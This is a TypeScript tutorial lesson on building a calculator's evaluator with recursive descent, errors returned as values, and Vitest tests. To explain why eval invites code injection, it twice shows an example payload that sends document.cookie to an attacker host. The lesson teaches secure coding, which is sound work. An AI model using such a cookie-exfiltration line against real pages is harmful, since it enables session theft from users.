# Calculator — Lesson 04 — Arithmetic

## What You Will Build

Pressing `=` evaluates the expression on the display and shows the result.
`8 - 3 =` shows `5`. `3 + 4 * 2 =` shows `11` — multiplication binds tighter
than addition without any special-casing. `1 / 0 =` shows a clear error message,
not a crash. The first automated tests verify the evaluator before it is connected
to the display.

## What You Need to Know First

Lessons 01–03. The input state machine builds an expression string in
`displayValue`. This lesson reads that string and computes its value when `=`
is pressed.

---

## The Problem

The display holds the string `'3+4*2'`. We need to compute its value.

The simplest possible approach is `eval('3+4*2')`. JavaScript has a built-in
function named `eval` that takes a string and executes it as code. `eval('3+4*2')`
returns `11`. It would pass every arithmetic test we can write.

**Why `eval` is a security vulnerability:**
`eval` does not evaluate arithmetic — it **executes arbitrary JavaScript**. Any
string it receives is run as code with full access to everything the page can
access: the DOM, cookies, local storage, and the network. If a user types
`fetch('https://attacker.com/?c='+document.cookie)` into the calculator and
presses `=`, `eval` sends their session cookies to an attacker's server.

This is **code injection**: user-supplied data is interpreted as executable code
rather than as data to be processed. It is one of the most exploited vulnerability
classes in web applications. The OWASP Top 10 — the security community's list of
the most critical web application risks — lists injection at or near the top every
year.

A calculator that uses `eval` is not a calculator. It is a **code execution
endpoint with a calculator-shaped interface**. Every browser's developer tools
panel is also a code execution interface — the difference is that a developer
panel makes the power explicit. A calculator hides it.

The fix: build an evaluator that processes the string as arithmetic only. Our
evaluator can add, subtract, multiply, and divide. It cannot execute code, open
network connections, or read local storage. The restriction is enforced by what
our parser can parse.

---

## Step 1 — A Type for Errors

### The problem

The evaluator can fail: division by zero, an empty expression string, a string
that is not valid arithmetic. The question is how to communicate failure to the
caller.

The common approach is to throw an exception. But **thrown exceptions are invisible
in function signatures**. A function declared as returning `number` might throw
anything — TypeScript cannot see thrown exceptions in the type system. A caller
has no way to know which functions can fail without reading the implementation.

The correct approach here: **errors are values**. The evaluator returns
`number | CalcError`. The caller sees immediately that both cases are possible.
TypeScript can enforce that both cases are handled.

### The code

Create `src/calc-error.ts`:

```typescript
export type CalcErrorCode =
  | 'DIVISION_BY_ZERO'
  | 'INVALID_EXPRESSION'
  | 'UNKNOWN'
```

**Union types — first appearance:**
`CalcErrorCode` is a **union type**: a value that can be any one of the listed
types. The `|` operator means "or." `CalcErrorCode` accepts exactly these three
strings and rejects everything else. A function accepting `CalcErrorCode` will
produce a compile error for `'TYPO'` — the typo is caught before the code runs.

Union types are one of TypeScript's most powerful features. They appear everywhere:
`number | null` (a value that may be absent), `string | string[]` (a value that
may be singular or multiple), `SuccessResult | ErrorResult` (a result that may
succeed or fail). The union type makes the "or" explicit in the type system rather
than leaving it implicit in comments or documentation.

```typescript
export interface CalcError {
  isError: true
  code:    CalcErrorCode
  message: string
}

export function makeError(code: CalcErrorCode, message: string): CalcError {
  return { isError: true, code, message }
}

export function isCalcError(value: unknown): value is CalcError {
  return typeof value === 'object' && value !== null && 'isError' in value
}
```

**What `src/calc-error.ts` is:**
`calc-error.ts` owns the error type. Every part of the system that can fail uses
`CalcError`. One definition, used everywhere, so all error handling looks the same.

**`isCalcError` — type guard — first appearance:**
`isCalcError(value: unknown): value is CalcError` is a **type guard function**.
The return type `value is CalcError` is a **type predicate**. When this function
returns `true`, TypeScript narrows the type of `value` from `unknown` to `CalcError`
in any branch that follows:

```typescript
const result = evaluate('3+4')
if (isCalcError(result)) {
  // TypeScript knows result is CalcError here
  console.log(result.message)  // allowed — .message exists on CalcError
} else {
  // TypeScript knows result is number here
  console.log(result + 1)  // allowed — arithmetic on number
}
```

Without the type guard, TypeScript does not know which variant of `number | CalcError`
`result` holds after the check. With it, the type system automatically tracks what
has been verified.

**`unknown` vs `any`:**
The parameter type is `unknown`, not `any`. Both mean "I don't know the type" — but
they differ in what you can do with the value. A value of type `any` can be used
without checks (TypeScript pretends it is whatever type the code needs). A value of
type `unknown` cannot be used until its type is narrowed by a check. `unknown` forces
verification; `any` bypasses it. The `isCalcError` function accepts `unknown` because
it is designed to receive any value and verify whether it is a `CalcError`.

**CS lens — errors as values:**
`CalcError` is a plain object returned from a function — not a thrown exception.
The evaluator returns `number | CalcError`. The caller uses `isCalcError` to
distinguish them. This is the **error-as-value pattern**, common in Go (where
functions return `(value, error)` pairs), Rust (where functions return `Result<T, E>`),
and Haskell (where they return `Either Error Value`). The pattern makes errors
visible in the type system. A caller who forgets to check `isCalcError` is not
making a logic error — TypeScript will not let them access `result.message` without
checking, because `result` might be a `number`.

Contrast with thrown exceptions: a function that says it returns `number` might
throw. Nothing in the type system warns callers. The `CalcError` pattern makes the
contract honest.

**What breaks without this:**
If the evaluator threw on division by zero, every caller would need `try/catch`.
TypeScript would not warn if the `try/catch` were missing. An uncaught exception
in an event handler causes a silent failure: the click handler stops executing,
the display does not update, the user does not know why. With `number | CalcError`,
TypeScript requires handling both cases at every call site.

---

## Step 2 — The Evaluator

### The problem

To evaluate `3 + 4 * 2` correctly, `*` must bind tighter than `+`. The result
must be `11` — not `14`. If we process operators left to right, we get
`(3 + 4) * 2 = 14`. We need multiplication to be evaluated before addition.

This is **operator precedence**. The solution is a recursive structure where
lower-precedence operations call higher-precedence functions to evaluate their
operands. Multiplication is evaluated as part of evaluating the operands of
addition — so multiplication is always fully resolved before addition sees
the result.

### The code

Create `src/evaluator.ts`:

```typescript
import { CalcError, makeError, isCalcError } from './calc-error.js'
```

**Import explanation:**
`calc-error.ts` is the module responsible for the error type (this lesson).
We import three things: `CalcError` (the type, for return type annotations),
`makeError` (the constructor function, for creating error values), and `isCalcError`
(the type guard, for checking whether a result is an error). We import exactly
what is needed and nothing more.

```typescript
export type EvalResult = number | CalcError

export function evaluate(expression: string): EvalResult {
  const trimmedExpression = expression.trim()
  if (trimmedExpression.length === 0) {
    return makeError('INVALID_EXPRESSION', 'Empty expression')
  }
  return evaluateAddSubtract(trimmedExpression)
}
```

**`string.trim()` — first appearance:**
`expression.trim()` returns a new string with leading and trailing whitespace
(spaces, tabs, newlines) removed. `'  3 + 4  '.trim()` gives `'3 + 4'`. Trimming
before processing means expressions with extra spaces work correctly.

**`string.length` property:**
`str.length` is the number of characters in `str`. `'3+4'.length` is `3`.
`''.length` is `0`. The empty check guards against the user pressing `=` with
nothing in the display.

**What `src/evaluator.ts` is:**
`evaluator.ts` owns the arithmetic evaluation logic. It takes a string and returns
a number or error. It has no knowledge that a calculator UI exists — no DOM access,
no state access. This isolation is what makes it testable in complete isolation.

```typescript
function evaluateAddSubtract(expression: string): EvalResult {
  const splitResult = splitOnOperator(expression, ['+', '-'])
  if (splitResult === null) {
    return evaluateMultiplyDivide(expression)
  }

  const leftResult  = evaluateAddSubtract(splitResult.left)
  const rightResult = evaluateMultiplyDivide(splitResult.right)

  if (isCalcError(leftResult))  return leftResult
  if (isCalcError(rightResult)) return rightResult

  return splitResult.operator === '+'
    ? leftResult + rightResult
    : leftResult - rightResult
}

function evaluateMultiplyDivide(expression: string): EvalResult {
  const splitResult = splitOnOperator(expression, ['*', '/'])
  if (splitResult === null) {
    return parseNumber(expression)
  }

  const leftResult  = evaluateMultiplyDivide(splitResult.left)
  const rightResult = parseNumber(splitResult.right)

  if (isCalcError(leftResult))  return leftResult
  if (isCalcError(rightResult)) return rightResult

  if (splitResult.operator === '/') {
    if (rightResult === 0) {
      return makeError('DIVISION_BY_ZERO', 'Division by zero')
    }
    return leftResult / rightResult
  }

  return leftResult * rightResult
}

function parseNumber(expression: string): EvalResult {
  const trimmed     = expression.trim()
  const parsedValue = Number(trimmed)
  if (isNaN(parsedValue)) {
    return makeError('INVALID_EXPRESSION', `Cannot parse: "${trimmed}"`)
  }
  return parsedValue
}

interface SplitResult {
  left:     string
  operator: string
  right:    string
}

function splitOnOperator(
  expression: string,
  operators:  string[],
): SplitResult | null {
  // Scan right to left: split on the LAST occurrence for left-associativity.
  // 10 - 3 - 2 must evaluate as (10 - 3) - 2 = 5, not 10 - (3 - 2) = 9.
  for (let index = expression.length - 1; index >= 0; index--) {
    const character = expression[index]
    if (character !== undefined && operators.includes(character)) {
      if (index === 0) continue  // leading minus is unary, not binary
      return {
        left:     expression.slice(0, index),
        operator: character,
        right:    expression.slice(index + 1),
      }
    }
  }
  return null
}
```

**`Number(string)` — first appearance:**
`Number('42')` converts a string to a number. `Number('3.14')` gives `3.14`.
`Number('abc')` gives `NaN` (Not a Number) — a special numeric value meaning
"the result of an operation that has no meaningful numeric answer."

**`isNaN(value)` — first appearance:**
`isNaN(value)` returns `true` if `value` is `NaN`. Note: use `Number.isNaN` for
most purposes (it only returns `true` for the actual `NaN` value). The global
`isNaN` first coerces its argument: `isNaN('hello')` is `true` because
`Number('hello')` is `NaN`. Here `parsedValue` is already a number (the output
of `Number()`), so both are equivalent, but `Number.isNaN` is the safer habit.
It is introduced in lesson 13.

**`string.slice(start, end)` — first appearance:**
`expression.slice(0, index)` returns the characters from position `0` up to (not
including) `index`. `expression.slice(index + 1)` returns everything after
`index`. These extract the left and right parts of the expression around the split
operator.

**`Array.includes(value)` — first appearance:**
`operators.includes(character)` returns `true` if `character` is in the `operators`
array. For `operators = ['+', '-']` and `character = '+'`, it returns `true`.
It is equivalent to `operators[0] === character || operators[1] === character` but
works for arrays of any length.

**`for` loop with `let` — first appearance:**
`for (let index = expression.length - 1; index >= 0; index--)` is a C-style `for`
loop. `let index = expression.length - 1` initialises the counter to the last
character position. `index >= 0` is the condition: loop while true. `index--`
decrements the counter after each iteration. This loop scans the string from right
to left — from the last character to the first.

The `for...of` loop (lesson 02) is preferred when you need each element and do not
need the index. The `for (let i = ...)` loop is appropriate when you need the index
— here we need `index` to know where to split the string.

### Walkthrough — evaluating `3 + 4 * 2`

`evaluate('3 + 4 * 2')` → trims to `'3 + 4 * 2'` → calls `evaluateAddSubtract('3 + 4 * 2')`.

**`evaluateAddSubtract('3 + 4 * 2')`:**
`splitOnOperator` scans right to left. Finds `+` at index 2.
Returns `{ left: '3', operator: '+', right: ' 4 * 2' }`.

Left: `evaluateAddSubtract('3')`.
→ No `+` or `-` found in `'3'`. Calls `evaluateMultiplyDivide('3')`.
→ No `*` or `/` found. Calls `parseNumber('3')`. Returns `3`.

Right: `evaluateMultiplyDivide(' 4 * 2')`.
→ `splitOnOperator` finds `*`. Returns `{ left: ' 4', operator: '*', right: ' 2' }`.
→ Left: `evaluateMultiplyDivide(' 4')` → `parseNumber(' 4')` → `Number('4')` = `4`.
→ Right: `parseNumber(' 2')` → `Number('2')` = `2`.
→ `4 * 2 = 8`. Returns `8`.

Back in `evaluateAddSubtract`: `3 + 8 = 11`. Returns `11`. ✓

**Why right-to-left scanning gives left-associativity:**
For `10 - 3 - 2`, scanning right to left finds the `-` at position 5 (between `3`
and `2`) first. That splits into left=`'10 - 3'` and right=`'2'`.

Then `evaluateAddSubtract('10 - 3')` splits again: left=`'10'`, right=`'3'`.
`10 - 3 = 7`. Then `7 - 2 = 5`. ✓ This is `(10 - 3) - 2` — left-associative.

If we had scanned left to right and found the first `-` (position 2 in `'10 - 3'`),
we would split into left=`'10'` and right=`'3 - 2'`. Right gives `1`. Then
`10 - 1 = 9`. That is `10 - (3 - 2)` — right-associative and wrong.

**CS lens — recursive descent and operator precedence:**
`evaluateAddSubtract` calls `evaluateMultiplyDivide` to handle each operand.
`evaluateMultiplyDivide` calls `parseNumber`. Each level calls the level below it.
Multiplication binds tighter than addition because `evaluateMultiplyDivide` is
called to evaluate the *operands of addition* — so multiplication is always fully
resolved before addition sees the result.

This is **recursive descent evaluation**: a function for each precedence level, each
calling the next level down. This is the same algorithm underlying every compiler,
interpreter, and linter ever written. In lesson 07 it grows into a full recursive
descent parser with parentheses and exponentiation. The structure is identical; the
grammar grows.

Recursive descent was formalised in the 1960s and has been the dominant technique
for hand-written parsers ever since. GCC (the C/C++ compiler), V8 (Chrome's
JavaScript engine), the TypeScript compiler, and Clang all use recursive descent
parsers.

**SE lens — pure function, replaceable interface:**
`evaluate` takes a string and returns a number or error. It does not touch the DOM.
It does not read from `CalculatorState`. It has no knowledge that a calculator exists.

This isolation serves two purposes. First, it is testable: `evaluate('3 + 4 * 2')`
can be called in a test file with no browser, no DOM, no setup. Second, it is
replaceable: in lesson 07, `evaluate` is replaced by a full expression parser.
The replacement requires changing exactly two lines in `input-reducer.ts`. Everything
else stays the same because the interface — `string → number | CalcError` — was
stable.

---

## Step 3 — Tests

### The problem

`evaluate` is a pure function. Before connecting it to the UI, verify it is correct
by writing automated tests. A test catches bugs at the source — before they become
confusing display errors.

### What Vitest is

`vitest` is a **test runner** — a tool that finds files matching `*.test.ts`,
executes them, and reports results. It was installed in `devDependencies` in lesson 02.
It is designed for projects using Vite and TypeScript and requires no configuration
beyond the entry in `package.json`.

**Running tests:**

```
npm test
```

This executes the `"test": "vitest"` script from `package.json`. Vitest scans the
`src/` directory for test files and runs them.

**What successful output looks like:**

```
 ✓ src/evaluator.test.ts (8 tests) 14ms

 Test Files  1 passed (1)
      Tests  8 passed (8)
   Duration  312ms
```

Each `✓` is a passing test. The count and duration are shown at the end.

**What a failing test looks like:**

```
 ✗ src/evaluator.test.ts > evaluate > respects operator precedence: * before +

AssertionError: expected 14 to be 11

- Expected  "11"
+ Received  "14"

 at src/evaluator.test.ts:18:3
```

The test label tells you what failed. The `Expected` / `Received` lines tell you
what value was wanted and what value was produced. The file path and line number
(`:18:3`) are clickable in most terminals — clicking opens that file at that line.

**Diagnosing a failing test:**
If `evaluate('3 + 4 * 2')` returns `14` instead of `11`, the `splitOnOperator`
function is finding the wrong split point. Add `console.log('Split:', splitOnOperator('3 + 4 * 2', ['+', '-']))` inside `evaluateAddSubtract` to see what
it finds. The output in the terminal (not the browser — Vitest runs in Node.js)
will show the split result and reveal whether the scan direction or the operator
matching is wrong.

### The code

Create `src/evaluator.test.ts`:

```typescript
import { describe, test, expect } from 'vitest'
```

**Import explanation:**
`vitest` is the test runner package. We import three named exports:
- `describe(label, fn)` — groups related tests under a label; the label appears in
  the output
- `test(label, fn)` — defines one test case; if `fn` throws, the test fails
- `expect(value)` — creates an assertion object; its methods check the value
  against an expectation

All three are used in every test file from this lesson onward.

```typescript
import { evaluate }    from './evaluator.js'
import { isCalcError } from './calc-error.js'
```

`evaluator.ts` is the module we are testing. We import `evaluate` — the function
being tested. `calc-error.ts` provides `isCalcError` — the type guard used in tests
that expect an error result.

```typescript
describe('evaluate', () => {
  test('evaluates addition', () => {
    expect(evaluate('3 + 4')).toBe(7)
  })

  test('evaluates subtraction', () => {
    expect(evaluate('8 - 3')).toBe(5)
  })

  test('evaluates multiplication', () => {
    expect(evaluate('6 * 7')).toBe(42)
  })

  test('evaluates division', () => {
    expect(evaluate('10 / 4')).toBe(2.5)
  })

  test('respects operator precedence: * before +', () => {
    expect(evaluate('3 + 4 * 2')).toBe(11)
  })

  test('respects operator precedence: * before -', () => {
    expect(evaluate('10 - 2 * 3')).toBe(4)
  })

  test('left-associativity: 10 - 3 - 2 = 5', () => {
    expect(evaluate('10 - 3 - 2')).toBe(5)
  })

  test('returns CalcError for division by zero', () => {
    const result = evaluate('10 / 0')
    expect(isCalcError(result)).toBe(true)
    if (isCalcError(result)) {
      expect(result.code).toBe('DIVISION_BY_ZERO')
    }
  })

  test('returns CalcError for empty expression', () => {
    const result = evaluate('')
    expect(isCalcError(result)).toBe(true)
  })
})
```

**`.toBe(expected)` — first appearance:**
`expect(value).toBe(expected)` checks that `value === expected`. It uses strict
equality (`===`): same type and same value. For numbers, `toBe(7)` checks that
the result is the number `7`. For strings, `toBe('DIVISION_BY_ZERO')` checks
exact string equality. If the check fails, Vitest throws an error and marks
the test as failed.

**`.toBe` vs `.toEqual`:**
`.toBe` uses `===` — it checks identity for objects. `{ a: 1 } === { a: 1 }` is
`false` even though the objects have the same content (they are two different
objects). For objects, use `.toEqual`, which recursively compares structure.
For primitive values (numbers, strings, booleans), `.toBe` is always correct.

Run `npm test`. All tests pass before touching `input-reducer.ts`.

**SE lens — tests as executable specifications:**
These tests are the specification of what `evaluate` must do, written in code.
They were written before `evaluate` was connected to the UI. If a future change
breaks `3 + 4 * 2 = 11`, the test fails immediately at the source. Without tests,
the breakage would manifest as a wrong result on the display — traced back to the
evaluator only after debugging.

A test that says "respects operator precedence: * before +" is a permanent,
machine-executable claim. If the claim ever becomes false, the test runner reports
it. No manual checking required.

---

## Step 4 — Wire to the Display

### The problem

The evaluator exists and is verified. Now connect it: when `=` is pressed,
evaluate `state.displayValue` and produce a new state with the result.

### The code

Update `applyEquals` in `src/input-reducer.ts`:

```typescript
import { evaluate }    from './evaluator.js'
import { isCalcError } from './calc-error.js'
```

**Import explanations:**
`evaluator.ts` owns the arithmetic evaluation (this lesson). We import `evaluate` —
the function called when `=` is pressed. `calc-error.ts` owns the error type.
We import `isCalcError` to check whether `evaluate` returned an error or a number.

```typescript
function applyEquals(state: CalculatorState): CalculatorState {
  const evaluationResult = evaluate(state.displayValue)

  if (isCalcError(evaluationResult)) {
    return {
      ...state,
      displayValue:    `Error: ${evaluationResult.message}`,
      inputState:      InputState.IDLE,
      hasDecimalPoint: false,
    }
  }

  return {
    ...state,
    displayValue:    String(evaluationResult),
    inputState:      InputState.AFTER_EQUALS,
    hasDecimalPoint: String(evaluationResult).includes('.'),
  }
}
```

**`String(number)` — first appearance:**
`String(11)` converts the number `11` to the string `'11'`. `String(2.5)` gives
`'2.5'`. It is the standard way to convert a number to a string. `displayValue`
is always a `string`, so the result must be converted before storing.

**`string.includes(substring)` — first appearance:**
`String(result).includes('.')` returns `true` if the string contains the character
`'.'`. `'2.5'.includes('.')` is `true`. `'11'.includes('.')` is `false`. Used here
to keep `hasDecimalPoint` accurate after `=` produces a decimal result, so that
subsequent input handles the decimal correctly.

### Walkthrough — pressing `8 - 3 =`

State before `=`: `{ displayValue: '8-3', inputState: 'AFTER_OPERATOR', ... }`

`evaluate('8-3')`:
→ `evaluateAddSubtract('8-3')` → scans right to left, finds `-` at index 1.
→ Left: `evaluateAddSubtract('8')` → `parseNumber('8')` → `8`.
→ Right: `evaluateMultiplyDivide('3')` → `parseNumber('3')` → `3`.
→ `8 - 3 = 5`. Returns `5`.

`isCalcError(5)` → `false`. `String(5)` → `'5'`. `'5'.includes('.')` → `false`.

Returns: `{ displayValue: '5', inputState: 'AFTER_EQUALS', hasDecimalPoint: false }`.

`updateDisplay()` sets the `<span>` to `'5'`. Display shows `5`. ✓

**Press `=` again immediately:**
`evaluate('5')` → `parseNumber('5')` → `5`. Display remains `5`. ✓ Re-evaluating
a result is idempotent.

**Division by zero: `1/0=`:**
`evaluate('1/0')` → `evaluateMultiplyDivide('1/0')` → finds `/` → `1 / 0` → returns
`makeError('DIVISION_BY_ZERO', 'Division by zero')`.

`isCalcError(result)` → `true`. Returns state with `displayValue: 'Error: Division by zero'`.
Display shows the error message. `inputState` becomes `IDLE` — the next button press
starts fresh.

Open the browser (`npm run dev` from lesson 02 should still be running). Press `8`,
`-`, `3`, `=`. Display shows `5`. Press `1`, `/`, `0`, `=`. Display shows
`Error: Division by zero`.

---

## Connect the Pieces

`evaluate` is the first function in the pipeline that converts input to output.
It consumes `displayValue` and produces a number or error. In lesson 07, `evaluate`
is replaced by a full recursive descent parser that handles parentheses, exponentiation,
and unary minus. When that replacement happens, only two lines change in
`input-reducer.ts` — the import and the function call. The interface
(`string → number | CalcError`) stays the same; the implementation improves.

`CalcError` established here is used by every subsequent module that can fail:
the expression parser (lesson 07), the integrator (lesson 16), the bisection solver
(lesson 18), Newton's method (lesson 20). One error type, used everywhere, so all
error handling follows the same pattern.

---

## What Breaks Without This

**Using `eval`:**
`eval('3+4*2')` returns `11`. It passes every arithmetic test.
`eval('fetch("https://attacker.com/?c="+document.cookie)')` also runs — silently
sending the user's session cookies to an external server. Search any security
advisory database for "eval injection" — this is a well-documented attack vector
with real-world incidents. Our evaluator processes arithmetic. It cannot do anything
else.

**Without the error type:**
If `evaluate` threw on division by zero instead of returning `CalcError`, the
click handler would need `try/catch`. TypeScript would not warn if the `try/catch`
were missing — exceptions are invisible to the type system. An uncaught exception
in an event handler causes a silent failure: the display freezes with no message.
With `number | CalcError`, TypeScript requires handling both cases. The error
cannot be accidentally ignored.

---

## Definition of Done

- [ ] `8 - 3 =` → display shows `5`
- [ ] `6 * 7 =` → display shows `42`
- [ ] `10 / 4 =` → display shows `2.5`
- [ ] `3 + 4 * 2 =` → display shows `11` (not `14`)
- [ ] `1 / 0 =` → display shows `Error: Division by zero`
- [ ] `npm test` passes all tests in `evaluator.test.ts`
- [ ] `eval()` is not used anywhere in the codebase
- [ ] You can explain what code injection is and why `eval` on user input enables it
- [ ] You can explain union types (`number | CalcError`) and what they express
- [ ] You can explain what a type guard is and what `value is CalcError` means in
      a return type
- [ ] You can explain the difference between `unknown` and `any`
- [ ] You can trace `3 + 4 * 2` through the two-level recursive evaluator step by step
- [ ] You can explain why scanning right to left gives left-associativity
- [ ] You can explain what `describe`, `test`, `expect`, and `.toBe` do
- [ ] You can explain what `npm test` runs and how to read a failing test output
- [ ] You can explain what `.toBe` checks and when to use `.toEqual` instead
- [ ] Run:
      ```
      git add src/calc-error.ts src/evaluator.ts src/evaluator.test.ts src/input-reducer.ts
      git commit -m "Add arithmetic evaluation: recursive descent handles operator precedence, errors returned as values not thrown, eval never used"
      ```

---

*Next: Lesson 05 — Floating Point. `0.1 + 0.2 =` shows `0.30000000000000004`. This
is the correct answer. The lesson explains why computers cannot represent `0.1` exactly
in binary, what IEEE 754 is, and how to format results to a configurable number of
significant figures.*
